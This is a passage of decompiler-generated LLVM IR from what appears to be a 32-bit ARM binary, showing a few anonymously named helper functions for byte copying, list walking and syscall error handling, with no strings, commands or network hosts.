  uselistorder i32 40, { 7, 8, 9, 1, 11, 10, 2, 17, 5, 3, 0, 12, 13, 14, 15, 16, 6, 4 }
  uselistorder i32 36, { 19, 20, 22, 23, 24, 25, 7, 4, 6, 21, 1, 5, 28, 8, 9, 10, 11, 0, 2, 12, 13, 3, 14, 15, 26, 27, 16, 17, 18 }
  uselistorder i32 7, { 9, 10, 8, 0, 6, 7, 4, 1, 2, 15, 12, 13, 14, 3, 11, 5 }
  uselistorder i32 28, { 17, 4, 6, 5, 21, 22, 23, 25, 26, 7, 8, 24, 9, 10, 43, 32, 18, 47, 16, 27, 11, 1, 33, 12, 13, 14, 15, 19, 20, 2, 28, 44, 45, 29, 30, 34, 35, 36, 37, 38, 39, 40, 0, 41, 46, 3, 31, 42 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_17ac0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17ac0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17ac0 = load i32, i32* @r4, align 4
  store i32 %v3_17ac0, i32* %stack_var_-16, align 4
  %v9_17ac0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_17ac8 = load i32, i32* %arg1, align 4
  store i32 %v2_17ac8, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_17ad4 = inttoptr i32 %v2_17ac8 to i8*
  %v2_17ad4 = call i32 @function_17d88(i8* %v1_17ad4)
  store i32 %v2_17ad4, i32* %r0.global-to-local, align 4
  %v1_17ad8 = icmp slt i32 %v2_17ad4, 0
  br i1 %v1_17ad8, label %dec_label_pc_17b18, label %dec_label_pc_17ae0

dec_label_pc_17ae0:                               ; preds = %dec_label_pc_17ac0
  %v1_17ae0 = load i32, i32* @r5, align 4
  %v2_17ae0 = sub i32 %v1_17ae0, %v2_17ad4
  %v7_17ae8 = icmp slt i32 %v2_17ae0, 4
  br i1 %v7_17ae8, label %bb, label %dec_label_pc_17af0

bb:                                               ; preds = %dec_label_pc_17ae0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ae0
  %v0_17af0 = load i32, i32* @r4, align 4
  %v1_17af0 = add i32 %v0_17af0, 5
  %v2_17af0 = inttoptr i32 %v1_17af0 to i8*
  %v3_17af0 = load i8, i8* %v2_17af0, align 1
  %v2_17af4 = load i32, i32* @r6, align 4
  %v4_17af4 = add i32 %v2_17af4, %v2_17ad4
  %v5_17af4 = inttoptr i32 %v4_17af4 to i8*
  store i8 %v3_17af0, i8* %v5_17af4, align 1
  %v0_17af8 = load i32, i32* @r4, align 4
  %v1_17af8 = add i32 %v0_17af8, 4
  %v2_17af8 = inttoptr i32 %v1_17af8 to i32*
  %v3_17af8 = load i32, i32* %v2_17af8, align 4
  %v0_17afc = load i32, i32* @r6, align 4
  %v1_17afc = load i32, i32* %r0.global-to-local, align 4
  %v2_17afc = add i32 %v1_17afc, %v0_17afc
  store i32 %v2_17afc, i32* %r2.global-to-local, align 4
  %v1_17b00 = trunc i32 %v3_17af8 to i8
  %v3_17b00 = add i32 %v2_17afc, 1
  %v4_17b00 = inttoptr i32 %v3_17b00 to i8*
  store i8 %v1_17b00, i8* %v4_17b00, align 1
  %v0_17b04 = load i32, i32* @r4, align 4
  %v1_17b04 = add i32 %v0_17b04, 9
  %v2_17b04 = inttoptr i32 %v1_17b04 to i8*
  %v3_17b04 = load i8, i8* %v2_17b04, align 1
  %v2_17b08 = load i32, i32* %r2.global-to-local, align 4
  %v3_17b08 = add i32 %v2_17b08, 2
  %v4_17b08 = inttoptr i32 %v3_17b08 to i8*
  store i8 %v3_17b04, i8* %v4_17b08, align 1
  %v0_17b0c = load i32, i32* @r4, align 4
  %v1_17b0c = add i32 %v0_17b0c, 8
  %v2_17b0c = inttoptr i32 %v1_17b0c to i32*
  %v3_17b0c = load i32, i32* %v2_17b0c, align 4
  %v1_17b10 = trunc i32 %v3_17b0c to i8
  %v2_17b10 = load i32, i32* %r2.global-to-local, align 4
  %v3_17b10 = add i32 %v2_17b10, 3
  %v4_17b10 = inttoptr i32 %v3_17b10 to i8*
  store i8 %v1_17b10, i8* %v4_17b10, align 1
  %v0_17b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_17b14 = add i32 %v0_17b14, 4
  store i32 %v1_17b14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17b18:                               ; preds = %bb, %dec_label_pc_17ac0, %dec_label_pc_17af0
  %v1_17b1c = phi i32 [ -1, %bb ], [ %v2_17ad4, %dec_label_pc_17ac0 ], [ %v1_17b14, %dec_label_pc_17af0 ]
  %v2_17b18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17b18, i32* @r4, align 4
  store i32 %v9_17ac0, i32* @r6, align 4
  ret i32 %v1_17b1c

; uselistorder directives
  uselistorder i32 %v2_17ad4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 13, 14, 15, 17, 18, 1, 26, 12, 2, 19, 0, 20, 21, 3, 4, 10, 16, 7, 8, 9, 22, 23, 24, 25, 5, 6, 11 }
  uselistorder i32 5, { 15, 16, 17, 7, 13, 8, 18, 9, 3, 14, 10, 4, 0, 22, 5, 19, 6, 2, 20, 21, 11, 12, 1 }
  uselistorder label %dec_label_pc_17b18, { 2, 0, 1 }
}

define i32 @function_17b20() local_unnamed_addr {
dec_label_pc_17b20:
  store i32 ptrtoint ([11 x i8]* @global_var_1ae2c.719 to i32), i32* @r0, align 4
  %v2_17b38 = call i32 @function_13694(i32 ptrtoint ([11 x i8]* @global_var_1ae2c.719 to i32))
  ret i32 %v2_17b38

; uselistorder directives
  uselistorder i32 (i32)* @function_13694, { 0, 2, 1 }
}

define i32 @function_17b50() local_unnamed_addr {
dec_label_pc_17b50:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_17b50 = load i32, i32* @r4, align 4
  %v6_17b50 = load i32, i32* @r5, align 4
  %v9_17b50 = load i32, i32* @r6, align 4
  %v12_17b50 = load i32, i32* @r7, align 4
  %v15_17b50 = load i32, i32* @r8, align 4
  %v18_17b50 = load i32, i32* @sb, align 4
  %v21_17b50 = load i32, i32* @sl, align 4
  %v24_17b50 = load i32, i32* @fp, align 4
  store i32 %tmp11, i32* @r5, align 4
  store i32 %tmp10, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 142964, i32* @r4, align 4
  %v2_17b78 = inttoptr i32 %tmp10 to i32*
  store i32 -1, i32* %v2_17b78, align 4
  %v0_17b7c = load i32, i32* @r0, align 4
  store i32 %v0_17b7c, i32* @r6, align 4
  %v0_17b80 = load i32, i32* @r1, align 4
  %v0_17b84 = load i32, i32* @r2, align 4
  store i32 %v0_17b84, i32* @r8, align 4
  %v0_17b88 = load i32, i32* @r3, align 4
  store i32 %v0_17b88, i32* @fp, align 4
  %v3_17b8c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_17b8c, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp11, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_17b98

.thread:                                          ; preds = %dec_label_pc_17b50
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_17d38

dec_label_pc_17b98:                               ; preds = %dec_label_pc_17b50
  %v2_17b98 = icmp eq i32 %v0_17b7c, 0
  br i1 %v2_17b98, label %dec_label_pc_17ba0, label %dec_label_pc_17bc0

dec_label_pc_17ba0:                               ; preds = %dec_label_pc_17b98
  %v0_17ba0 = call i32 @function_17b20()
  store i32 %v0_17ba0, i32* @r6, align 4
  %v2_17ba4 = icmp eq i32 %v0_17ba0, 0
  br i1 %v2_17ba4, label %dec_label_pc_17bac, label %dec_label_pc_17bc0

dec_label_pc_17bac:                               ; preds = %dec_label_pc_17ba0
  store i32 %tmp8, i32* %r2.global-to-local, align 4
  %v2_17bb0 = inttoptr i32 %tmp8 to i32*
  store i32 0, i32* %v2_17bb0, align 4
  %v0_17bb4 = call i32 @function_d0ec()
  %v1_17bb8 = inttoptr i32 %v0_17bb4 to i32*
  %v2_17bb8 = load i32, i32* %v1_17bb8, align 4
  store i32 %v2_17bb8, i32* @sb, align 4
  br label %dec_label_pc_17d38

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17ba0, %dec_label_pc_17b98
  %v1_17be0 = phi i32 [ %v0_17ba0, %dec_label_pc_17ba0 ], [ %v0_17b7c, %dec_label_pc_17b98 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1ae38.722 to i32), i32* @r4, align 4
  %v2_17bc8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp7, i32* %ip.global-to-local, align 4
  store i32 %tmp7, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_17be0 = add i32 %v1_17be0, 8
  %v3_17be0 = inttoptr i32 %v2_17be0 to i32*
  store i32 48, i32* %v3_17be0, align 4
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v0_17be8 = load i32, i32* @r5, align 4
  %v1_17be8 = add i32 %v0_17be8, -48
  store i32 %v1_17be8, i32* %r1.global-to-local, align 4
  %v0_17bec = load i32, i32* %ip.global-to-local, align 4
  %v1_17bec = add i32 %v0_17bec, 24
  store i32 %v1_17bec, i32* @ip, align 4
  %v0_17bf0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17bf0, i32* @sb, align 4
  %v0_17bf4 = load i32, i32* @lr, align 4
  %v1_17bf4 = add i32 %v0_17bf4, 32
  store i32 %v1_17bf4, i32* @sl, align 4
  %v1_17bf8 = load i32, i32* @r6, align 4
  %v2_17bf8 = add i32 %v1_17bf8, 16
  %v3_17bf8 = inttoptr i32 %v2_17bf8 to i32*
  store i32 %v1_17be8, i32* %v3_17bf8, align 4
  %v0_17bfc = load i32, i32* @r4, align 4
  %v0_17c00 = load i32, i32* @ip, align 4
  store i32 %v0_17c00, i32* %stack_var_-64, align 4
  %v0_17c04 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c04 = load i32, i32* %r3.global-to-local, align 4
  %v2_17c04 = inttoptr i32 %v1_17c04 to i32*
  store i32 %v0_17c04, i32* %v2_17c04, align 4
  %v0_17c08 = load i32, i32* @lr, align 4
  %v1_17c08 = load i32, i32* @r6, align 4
  %v2_17c08 = add i32 %v1_17c08, 4
  %v3_17c08 = inttoptr i32 %v2_17c08 to i32*
  store i32 %v0_17c08, i32* %v3_17c08, align 4
  %v2_17c38 = inttoptr i32 %v0_17b80 to i8*
  br label %dec_label_pc_17d0c

dec_label_pc_17c10:                               ; preds = %dec_label_pc_17d0c
  %v3_17c10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17c10, i32* %r1.global-to-local, align 4
  %v0_17c14 = load i32, i32* @fp, align 4
  %v7_17c14 = icmp eq i32 %v0_17c14, 1
  %v1_17c18 = add i32 %v3_17c10, 4
  store i32 %v1_17c18, i32* @r5, align 4
  %v1_17c1c = load i32, i32* @r7, align 4
  %v2_17c1c = add i32 %v1_17c1c, 4
  %v3_17c1c = inttoptr i32 %v2_17c1c to i32*
  store i32 %v1_17c18, i32* %v3_17c1c, align 4
  br i1 %v7_17c14, label %dec_label_pc_17d38, label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c10
  %v0_17c24 = load i32, i32* @fp, align 4
  %v7_17c24 = icmp eq i32 %v0_17c24, 2
  br i1 %v7_17c24, label %dec_label_pc_17c30, label %dec_label_pc_17c54.preheader

dec_label_pc_17c54.preheader:                     ; preds = %dec_label_pc_17c24
  %v1_17c28 = load i32, i32* @r5, align 4
  %v1_17c5426 = inttoptr i32 %v1_17c28 to i32*
  %v2_17c5427 = load i32, i32* %v1_17c5426, align 4
  store i32 %v2_17c5427, i32* %r3.global-to-local, align 4
  store i32 %v2_17c5427, i32* %r1.global-to-local, align 4
  %v2_17c5829 = icmp eq i32 %v2_17c5427, 0
  %v1_17c6030 = add i32 %v1_17c28, 4
  store i32 %v1_17c6030, i32* @r4, align 4
  br i1 %v2_17c5829, label %dec_label_pc_17d0c, label %dec_label_pc_17c48

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c24
  %v0_17c30 = load i32, i32* %r1.global-to-local, align 4
  %v1_17c30 = inttoptr i32 %v0_17c30 to i32*
  %v2_17c30 = load i32, i32* %v1_17c30, align 4
  store i32 %v2_17c30, i32* @r1, align 4
  %v3_17c38 = call i32 @function_f6e0(i8* %v2_17c38, i32 %v2_17c30)
  %v2_17c3c = icmp eq i32 %v3_17c38, 0
  br i1 %v2_17c3c, label %dec_label_pc_17c6c, label %dec_label_pc_17d0c

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c54.preheader, %dec_label_pc_17c48.dec_label_pc_17c54_crit_edge
  %v2_17c5431 = phi i32 [ %v2_17c54, %dec_label_pc_17c48.dec_label_pc_17c54_crit_edge ], [ %v2_17c5427, %dec_label_pc_17c54.preheader ]
  %v3_17c48 = call i32 @function_fa14(i8* %v2_17c38, i32 %v2_17c5431)
  %v2_17c4c = icmp eq i32 %v3_17c48, 0
  br i1 %v2_17c4c, label %dec_label_pc_17c6c, label %dec_label_pc_17c48.dec_label_pc_17c54_crit_edge

dec_label_pc_17c48.dec_label_pc_17c54_crit_edge:  ; preds = %dec_label_pc_17c48
  %v0_17c54.pre = load i32, i32* @r4, align 4
  %v1_17c54 = inttoptr i32 %v0_17c54.pre to i32*
  %v2_17c54 = load i32, i32* %v1_17c54, align 4
  store i32 %v2_17c54, i32* %r3.global-to-local, align 4
  store i32 %v2_17c54, i32* %r1.global-to-local, align 4
  %v2_17c58 = icmp eq i32 %v2_17c54, 0
  %v1_17c60 = add i32 %v0_17c54.pre, 4
  store i32 %v1_17c60, i32* @r4, align 4
  br i1 %v2_17c58, label %dec_label_pc_17d0c, label %dec_label_pc_17c48

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c48, %dec_label_pc_17c30
  %v0_17c6c = load i32, i32* @r5, align 4
  %v1_17c6c = inttoptr i32 %v0_17c6c to i32*
  %v2_17c6c = load i32, i32* %v1_17c6c, align 4
  store i32 %v2_17c6c, i32* %r3.global-to-local, align 4
  %v4_17c6c = add i32 %v0_17c6c, 4
  store i32 %v4_17c6c, i32* @r5, align 4
  %v2_17c70 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17c70, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_17c78 = load i32, i32* @r7, align 4
  %v2_17c78 = inttoptr i32 %v1_17c78 to i32*
  store i32 %v2_17c6c, i32* %v2_17c78, align 4
  %v0_17c7c = load i32, i32* @lr, align 4
  %v1_17c7c = load i32, i32* @ip, align 4
  %v2_17c7c = add i32 %v1_17c7c, 4
  %v3_17c7c = inttoptr i32 %v2_17c7c to i32*
  store i32 %v0_17c7c, i32* %v3_17c7c, align 4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v0_17c84 = load i32, i32* @r8, align 4
  %v7_17c84 = icmp eq i32 %v0_17c84, 2
  %v0_17c88 = load i32, i32* @r5, align 4
  %v1_17c88 = load i32, i32* @r7, align 4
  %v2_17c88 = add i32 %v1_17c88, 4
  %v3_17c88 = inttoptr i32 %v2_17c88 to i32*
  store i32 %v0_17c88, i32* %v3_17c88, align 4
  %v0_17c8c = load i32, i32* @ip, align 4
  %v1_17c8c = load i32, i32* @r7, align 4
  %v2_17c8c = add i32 %v1_17c8c, 16
  %v3_17c8c = inttoptr i32 %v2_17c8c to i32*
  store i32 %v0_17c8c, i32* %v3_17c8c, align 4
  %v0_17c90 = load i32, i32* @sl, align 4
  %v1_17c90 = load i32, i32* %r2.global-to-local, align 4
  %v2_17c90 = add i32 %v1_17c90, 24
  %v3_17c90 = inttoptr i32 %v2_17c90 to i32*
  store i32 %v0_17c90, i32* %v3_17c90, align 4
  br i1 %v7_17c84, label %dec_label_pc_17c98, label %dec_label_pc_17cc8

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c6c
  %v3_17c98 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17c98, i32* %r3.global-to-local, align 4
  %v0_17c9c = load i32, i32* @r8, align 4
  %v1_17ca0 = inttoptr i32 %v3_17c98 to i32*
  %v2_17ca0 = load i32, i32* %v1_17ca0, align 4
  store i32 %v2_17ca0, i32* %r1.global-to-local, align 4
  %v0_17ca4 = load i32, i32* @sl, align 4
  store i32 %v0_17ca4, i32* %r2.global-to-local, align 4
  %v3_17ca8 = inttoptr i32 %v2_17ca0 to i8*
  %v4_17ca8 = call i32 @function_15f88(i32 %v0_17c9c, i8* %v3_17ca8, i32 %v0_17ca4)
  %tmp24 = icmp slt i32 %v4_17ca8, 1
  br i1 %tmp24, label %dec_label_pc_17d08, label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17c98
  %v0_17cb8 = load i32, i32* @r7, align 4
  %v2_17cb8 = inttoptr i32 %tmp8 to i32*
  store i32 %v0_17cb8, i32* %v2_17cb8, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_17cc0 = load i32, i32* @r8, align 4
  %v1_17cc0 = load i32, i32* @r7, align 4
  %v2_17cc0 = add i32 %v1_17cc0, 8
  %v3_17cc0 = inttoptr i32 %v2_17cc0 to i32*
  store i32 %v0_17cc0, i32* %v3_17cc0, align 4
  %v0_17d00.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cfc

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17c6c
  %v0_17cc8 = load i32, i32* @r8, align 4
  %v7_17cc8 = icmp eq i32 %v0_17cc8, 10
  br i1 %v7_17cc8, label %dec_label_pc_17cd0, label %dec_label_pc_17d08

dec_label_pc_17cd0:                               ; preds = %dec_label_pc_17cc8
  %v3_17cd0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17cd0, i32* %r3.global-to-local, align 4
  %v1_17cd8 = inttoptr i32 %v3_17cd0 to i32*
  %v2_17cd8 = load i32, i32* %v1_17cd8, align 4
  store i32 %v2_17cd8, i32* %r1.global-to-local, align 4
  %v0_17cdc = load i32, i32* @sl, align 4
  store i32 %v0_17cdc, i32* %r2.global-to-local, align 4
  %v3_17ce0 = inttoptr i32 %v2_17cd8 to i8*
  %v4_17ce0 = call i32 @function_15f88(i32 10, i8* %v3_17ce0, i32 %v0_17cdc)
  %tmp25 = icmp slt i32 %v4_17ce0, 1
  br i1 %tmp25, label %dec_label_pc_17d08, label %dec_label_pc_17cec

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17cd0
  store i32 %tmp8, i32* @ip, align 4
  %v0_17cf0 = load i32, i32* @r8, align 4
  %v1_17cf0 = load i32, i32* @r7, align 4
  %v2_17cf0 = add i32 %v1_17cf0, 8
  %v3_17cf0 = inttoptr i32 %v2_17cf0 to i32*
  store i32 %v0_17cf0, i32* %v3_17cf0, align 4
  %v0_17cf4 = load i32, i32* @r7, align 4
  %v1_17cf4 = load i32, i32* @ip, align 4
  %v2_17cf4 = inttoptr i32 %v1_17cf4 to i32*
  store i32 %v0_17cf4, i32* %v2_17cf4, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cb4, %dec_label_pc_17cec
  %v0_17d00 = phi i32 [ %v0_17d00.pre, %dec_label_pc_17cb4 ], [ 16, %dec_label_pc_17cec ]
  store i32 0, i32* @sb, align 4
  %v1_17d00 = load i32, i32* @r7, align 4
  %v2_17d00 = add i32 %v1_17d00, 12
  %v3_17d00 = inttoptr i32 %v2_17d00 to i32*
  store i32 %v0_17d00, i32* %v3_17d00, align 4
  br label %dec_label_pc_17d30

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cc8, %dec_label_pc_17cd0, %dec_label_pc_17c98
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17c54.preheader, %dec_label_pc_17c48.dec_label_pc_17c54_crit_edge, %dec_label_pc_17c30, %dec_label_pc_17d08, %dec_label_pc_17bc0
  %v0_17d0c = load i32, i32* @r6, align 4
  store i32 %v2_17bc8, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_17bfc, i32* %r3.global-to-local, align 4
  %v5_17d1c = inttoptr i32 %v0_17d0c to i32*
  %v6_17d1c = call i32 @function_13338(i32* %v5_17d1c, i32 %v2_17bc8, i32 459270, i32 %v0_17bfc)
  %v2_17d20 = icmp eq i32 %v6_17d1c, 0
  br i1 %v2_17d20, label %dec_label_pc_17d28, label %dec_label_pc_17c10

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17d0c
  %v0_17d28 = load i32, i32* @fp, align 4
  %v7_17d28 = icmp eq i32 %v0_17d28, 1
  br i1 %v7_17d28, label %dec_label_pc_17d38, label %dec_label_pc_17d30

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d28, %dec_label_pc_17cfc
  %v0_17d30 = load i32, i32* @r6, align 4
  %v1_17d34 = inttoptr i32 %v0_17d30 to i32*
  %v2_17d34 = call i32 @function_13660(i32* %v1_17d34)
  br label %dec_label_pc_17d38

dec_label_pc_17d38:                               ; preds = %dec_label_pc_17c10, %.thread, %dec_label_pc_17d28, %dec_label_pc_17bac, %dec_label_pc_17d30
  %v0_17d38 = load i32, i32* @sb, align 4
  store i32 %v3_17b50, i32* @r4, align 4
  store i32 %v6_17b50, i32* @r5, align 4
  store i32 %v9_17b50, i32* @r6, align 4
  store i32 %v12_17b50, i32* @r7, align 4
  store i32 %v15_17b50, i32* @r8, align 4
  store i32 %v18_17b50, i32* @sb, align 4
  store i32 %v21_17b50, i32* @sl, align 4
  store i32 %v24_17b50, i32* @fp, align 4
  ret i32 %v0_17d38

; uselistorder directives
  uselistorder i32 %v2_17c54, { 1, 2, 3, 0 }
  uselistorder i32 %v0_17c54.pre, { 1, 0 }
  uselistorder i32 %v2_17bc8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp8, { 3, 2, 1, 0 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @function_13660, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @function_13338, { 2, 0, 1 }
  uselistorder i32 10, { 5, 27, 29, 30, 8, 33, 34, 35, 22, 23, 9, 10, 24, 37, 36, 11, 38, 12, 39, 13, 40, 41, 4, 43, 14, 44, 45, 15, 46, 16, 17, 28, 6, 0, 31, 32, 18, 50, 26, 3, 42, 51, 52, 47, 48, 19, 49, 1, 7, 25, 20, 2, 21 }
  uselistorder i32 (i8*, i32)* @function_fa14, { 7, 0, 1, 2, 3, 4, 5, 8, 6 }
  uselistorder i32 (i8*, i32)* @function_f6e0, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 24, { 36, 40, 42, 43, 0, 47, 7, 8, 1, 49, 44, 9, 41, 48, 2, 60, 61, 62, 10, 37, 38, 50, 11, 39, 12, 33, 34, 13, 35, 14, 15, 16, 17, 18, 19, 20, 45, 46, 21, 3, 63, 22, 23, 25, 24, 26, 4, 27, 28, 5, 6, 51, 52, 53, 54, 55, 56, 57, 58, 64, 29, 65, 30, 31, 32, 59 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 4, 15, 13, 14, 0, 1, 16, 17, 18, 2, 5, 19, 20, 6, 22, 23, 24, 7, 8, 9, 25, 3, 10, 21, 11, 12 }
  uselistorder i32 34, { 5, 6, 7, 8, 1, 2, 0, 4, 10, 3, 11, 9 }
  uselistorder i32 142964, { 2, 69, 1, 70, 0, 40, 71, 3, 4, 5, 6, 7, 8, 9, 11, 13, 12, 10, 14, 72, 15, 16, 73, 17, 18, 19, 74, 75, 76, 77, 78, 79, 20, 23, 24, 22, 21, 64, 60, 58, 57, 59, 61, 62, 63, 56, 65, 51, 53, 52, 50, 49, 54, 55, 46, 45, 48, 47, 44, 43, 42, 41, 66, 67, 68, 80, 25, 81, 82, 26, 27, 28, 29, 83, 30, 84, 31, 32, 38, 37, 36, 35, 34, 33, 85, 39, 86 }
  uselistorder i32* @fp, { 36, 37, 38, 39, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 2, 3, 72, 73, 74, 1, 75, 76, 77, 78, 79, 40, 41, 42, 43, 44, 45, 46, 47, 4, 58, 59, 60, 61, 103, 105, 104, 106, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 107, 108, 109, 110, 111, 112, 113, 114, 115, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 80, 81, 101, 102, 116, 117, 118, 82, 83, 84, 98, 99, 100, 14, 15, 16 }
  uselistorder i32* @sl, { 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 35, 36, 37, 38, 39, 0, 40, 1, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5, 6, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 15, 16, 17, 18, 19, 7, 8, 9, 10, 29, 30, 31, 32, 33, 34, 77, 78, 79, 2, 80, 81, 82, 83, 84, 85, 87, 3, 86, 89, 88, 90, 91, 92, 93, 60, 61, 62, 63, 64, 65, 66, 4, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32* @sb, { 7, 8, 9, 10, 15, 16, 17, 18, 21, 22, 35, 23, 24, 25, 2, 26, 36, 37, 3, 38, 39, 40, 41, 42, 43, 44, 4, 5, 6, 19, 20, 45, 46, 47, 48, 49, 50, 51, 11, 12, 13, 14, 27, 28, 29, 30, 31, 32, 33, 34, 61, 64, 62, 63, 65, 52, 53, 54, 55, 56, 57, 58, 0, 59, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 1, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 60 }
  uselistorder i32* @r8, { 23, 24, 25, 26, 27, 28, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 52, 53, 54, 55, 56, 57, 3, 58, 59, 60, 61, 62, 7, 8, 9, 35, 36, 63, 64, 65, 66, 67, 68, 69, 70, 71, 29, 30, 31, 32, 10, 11, 12, 13, 14, 4, 15, 47, 48, 5, 49, 50, 51, 84, 85, 86, 87, 88, 6, 89, 90, 91, 92, 93, 94, 95, 96, 16, 97, 19, 20, 0, 21, 72, 73, 74, 75, 76, 77, 2, 78, 1, 79, 80, 81, 17, 18, 98, 99, 22, 82, 83 }
  uselistorder label %dec_label_pc_17d38, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17d0c, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_17d08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17cfc, { 1, 0 }
  uselistorder label %dec_label_pc_17c48, { 1, 0 }
}

define i32 @function_17d54(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d54:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17d54 = load i32, i32* @r7, align 4
  store i32 %v3_17d54, i32* %stack_var_-8, align 4
  %v0_17d60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17d60, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17d60, -4095
  br i1 %tmp, label %dec_label_pc_17d80, label %dec_label_pc_17d70

dec_label_pc_17d70:                               ; preds = %dec_label_pc_17d54
  %v0_17d70 = call i32 @function_d0ec()
  %v0_17d74 = load i32, i32* %r7.global-to-local, align 4
  %v1_17d74 = sub i32 0, %v0_17d74
  %v2_17d78 = inttoptr i32 %v0_17d70 to i32*
  store i32 %v1_17d74, i32* %v2_17d78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17d80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17d54, %dec_label_pc_17d70
